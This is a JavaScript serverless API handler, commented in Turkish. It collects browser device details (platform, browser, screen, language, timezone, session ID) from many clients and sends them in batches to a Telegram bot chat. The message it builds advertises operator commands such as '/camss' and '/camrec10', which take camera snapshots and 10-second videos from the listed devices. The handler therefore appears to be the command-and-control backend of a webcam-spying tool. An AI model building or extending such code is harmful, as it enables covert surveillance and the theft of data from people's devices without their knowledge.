// 🔐 Collect Devices API - Tek mesajda tüm cihazları topla
// Her cihaz bilgisini gönderir, backend 3 saniye bekler ve hepsini birleştirir

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

// Geçici collection storage (warm instance'larda çalışır)
const deviceCollections = new Map(); // message_id -> {devices: [], timer: timeoutId}

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ success: false, error: 'Server configuration error' });
        }

        const { message_id, device_info } = req.body;

        if (!message_id || !device_info) {
            return res.status(400).json({ success: false, error: 'message_id and device_info required' });
        }

        const collectionKey = `devices_${message_id}`;

        // Collection yoksa oluştur
        if (!deviceCollections.has(collectionKey)) {
            deviceCollections.set(collectionKey, {
                devices: [],
                timer: null,
                created_at: Date.now()
            });
        }

        const collection = deviceCollections.get(collectionKey);

        // Cihazı listeye ekle
        collection.devices.push(device_info);
        console.log(`[CollectDevices] Device added to collection ${collectionKey}: ${collection.devices.length} devices`);

        // Timer varsa iptal et (yeni cihaz geldi, timer'ı resetle)
        if (collection.timer) {
            clearTimeout(collection.timer);
        }

        // 3 saniye sonra tüm cihazları gönder
        collection.timer = setTimeout(async () => {
            console.log(`[CollectDevices] Timer expired for ${collectionKey}, sending ${collection.devices.length} devices`);
            await sendConsolidatedMessage(botToken, chatId, collection.devices);
            deviceCollections.delete(collectionKey);
        }, 3000); // 3 saniye

        return res.status(200).json({
            success: true,
            message: 'Device added to collection',
            device_count: collection.devices.length,
            will_send_in: 3
        });

    } catch (error) {
        console.error('[CollectDevices] Error:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

// Tüm cihazları tek mesajda gönder
async function sendConsolidatedMessage(botToken, chatId, devices) {
    if (devices.length === 0) {
        return;
    }

    let message = `📱 <b>AKTİF CİHAZLAR</b>\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `Toplam: <b>${devices.length}</b> cihaz\n\n`;

    devices.forEach((device, index) => {
        const deviceNum = index + 1;
        const emoji = device.emoji || '📱';
        const platform = device.platform || 'Unknown';
        const browser = device.browser || 'Unknown';
        const session = device.session_id || 'unknown';

        message += `<b>${deviceNum}.</b> ${emoji} <code>${session}</code>\n`;
        message += `   🖥️ ${platform} - ${browser}\n`;
        
        if (device.screen) {
            message += `   📺 ${device.screen}\n`;
        }
        
        if (device.language) {
            message += `   🌐 ${device.language}\n`;
        }
        
        if (device.timezone) {
            message += `   🕐 ${device.timezone}\n`;
        }
        
        message += `   ${device.online === 'Online' ? '🟢 Online' : '🔴 Offline'}\n\n`;
    });

    message += `━━━━━━━━━━━━━━━━\n`;
    message += `💡 <b>Kullanım:</b>\n`;
    message += `• <code>/camss</code> - Tüm cihazlar\n`;
    message += `• <code>/camss ${devices.length > 1 ? '2' : '1'}</code> - Sadece ${devices.length > 1 ? '2.' : '1.'} cihaz\n`;
    message += `• <code>/camrec10</code> - 10s video (tüm cihazlar)\n`;
    message += `• <code>/help</code> - Tüm komutlar`;

    // Telegram'a gönder
    const url = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    });

    const result = await response.json();
    console.log('[CollectDevices] Message sent to Telegram:', result.ok);
}

